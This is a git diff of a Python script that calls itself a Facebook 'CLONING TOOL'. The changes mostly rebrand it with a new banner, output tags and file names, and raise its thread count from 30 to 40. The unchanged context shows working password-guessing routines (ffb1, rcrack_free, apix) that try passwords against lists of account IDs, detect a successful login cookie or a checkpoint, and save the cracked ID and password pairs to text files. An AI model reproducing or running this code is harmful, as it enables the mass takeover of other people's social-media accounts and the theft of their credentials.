@@ -1,6 +1,7 @@
+#KISS SA
 #NIÑO POGI
 #Facebook: Niño infiesto
-#Github : https://github.com/Ninouto
+#Github : https://github.com/Ninoutog
 from os import path
 import os,base64,zlib,pip,urllib
 try:
@@ -65,27 +66,27 @@ for x in range(10000):
 
 #menu_apikey()
 os.system('clear')
-logo = ("""                                                            
+logo = ("""                                                                                                                 
 ────────────────────────────────────────────────────────────────
-─██████──██████──██████████████──██████████████──██████████████─
-─██░░██──██░░██──██░░░░░░░░░░██──██░░░░░░░░░░██──██░░░░░░░░░░██─
-─██░░██──██░░██──██████░░██████──██░░██████░░██──██░░██████████─
-─██░░██──██░░██──────██░░██──────██░░██──██░░██──██░░██─────────
-─██░░██──██░░██──────██░░██──────██░░██──██░░██──██░░██─────────
-─██░░██──██░░██──────██░░██──────██░░██──██░░██──██░░██──██████─
-─██░░██──██░░██──────██░░██──────██░░██──██░░██──██░░██──██░░██─
-─██░░██──██░░██──────██░░██──────██░░██──██░░██──██░░██──██░░██─
-─██░░██████░░██──────██░░██──────██░░██████░░██──██░░██████░░██─
-─██░░░░░░░░░░██──────██░░██──────██░░░░░░░░░░██──██░░░░░░░░░░██─
-─██████████████──────██████──────██████████████──██████████████─
+─██████████──████████──████████──██████████████──██████████████─
+─██░░░░░░██──██░░░░██──██░░░░██──██░░░░░░░░░░██──██░░░░░░░░░░██─
+─████░░████──████░░██──██░░████──██░░██████░░██──██████░░██████─
+───██░░██──────██░░░░██░░░░██────██░░██──██░░██──────██░░██─────
+───██░░██──────████░░░░░░████────██░░██──██░░██──────██░░██─────
+───██░░██────────████░░████──────██░░██──██░░██──────██░░██─────
+───██░░██──────────██░░██────────██░░██──██░░██──────██░░██─────
+───██░░██──────────██░░██────────██░░██──██░░██──────██░░██─────
+─████░░████────────██░░██────────██░░██████░░██──────██░░██─────
+─██░░░░░░██────────██░░██────────██░░░░░░░░░░██──────██░░██─────
+─██████████────────██████────────██████████████──────██████─────
 ────────────────────────────────────────────────────────────────
  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  ┃ [\033[1;91m✓\033[1;92m] CREATOR   \033[1;91m: \033[1;92mPAPA NINS       
  ┃ [\033[1;91m✓\033[1;92m] TOOL      \033[1;91m: \033[1;92mCLONING TOOL             
- ┃ [\033[1;91m✓\033[1;92m] STATUS    \033[1;91m: \033[1;92mFREE                       
+ ┃ [\033[1;91m✓\033[1;92m] STATUS    \033[1;91m: \033[1;92mTRIAL                       
  ┃ [\033[1;91m✓\033[1;92m] SYSTEM    \033[1;91m: \033[1;92mDATA & WIFI                    
  ┃ [\033[1;91m✓\033[1;92m] FACEBOOK  \033[1;91m: \033[1;92mwww.facebook.com/100080607586393              
- ┃ [\033[1;91m✓\033[1;92m] VERSION \033[1;91m: \033[1;92m0.2          
+ ┃ [\033[1;91m✓\033[1;92m] VERSION \033[1;91m: \033[1;92m0.4          
  ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
 
 def linex():
@@ -160,7 +161,7 @@ def Spy():
 			pcp.append(f'n')
 		else:
 			pcp.append(f'y')
-		with tred(max_workers=30) as crack_submit:
+		with tred(max_workers=40) as crack_submit:
 			clear()
 			total_ids = str(len(fo))
 			print(f' Total Account : \033[1;32m'+total_ids+f' \n \033[1;37mMethod : \033[1;37mM{mthd}')
@@ -224,7 +225,7 @@ xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","G
 #
 def ffb1(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write(f'\r\r\033[1;37m [AVI] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r\033[1;37m [NINS] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(f' ')[0]
@@ -245,15 +246,15 @@ def ffb1(ids,names,passlist):
                         if "c_user" in Shahin:
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print(f'\r\r\033[1;32m [AVI-OK] %s | %s'%(ids,pas))
+                                print(f'\r\r\033[1;32m [NINS-OK] %s | %s'%(ids,pas))
                                 #cek_apk(session,coki)
                                 open(f'/sdcard/NINS-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Shahin:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;126m [INNOCENT-CP] '+ids+' | '+pas+'\033[1;97m')
-                                        open(f'/sdcard/AVI-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\x1b[38;5;126m [GUBA-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        open(f'/sdcard/NINS-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -574,7 +575,7 @@ def rcrack_free(idf,pwv):
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[141:156]
 				print('\n')
-				print('\033[1;91m[INNOCENT-CP] '+idf+' | '+ps+'\033[0;97m')
+				print('\033[1;91m[GUBA-CP] '+idf+' | '+ps+'\033[0;97m')
 				open('cp.txt', 'a').write(idf+' | '+ps+'\n')
 				cps.append(idf)
 				break
@@ -582,7 +583,7 @@ def rcrack_free(idf,pwv):
 				continue
 		loop+=1
 		bo = random.choice([m,k,h,b,u,x])
-		sys.stdout.write(f'\r\r\033[1;37m [AVI] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+		sys.stdout.write(f'\r\r\033[1;37m [NINS] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 		sys.stdout.flush()
 	
 	except:
@@ -642,7 +643,7 @@ def apix(ids,passlist):
                                         break
                                 elif 'www.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
-                                                print(f'\r\r\x1b[38;5;126m [INNOCENT-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                print(f'\r\r\x1b[38;5;126m [GUBA-CP] '+ids+' | '+pas+'\033[1;97m')
                                                 open(f'/sdcard/NINS-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
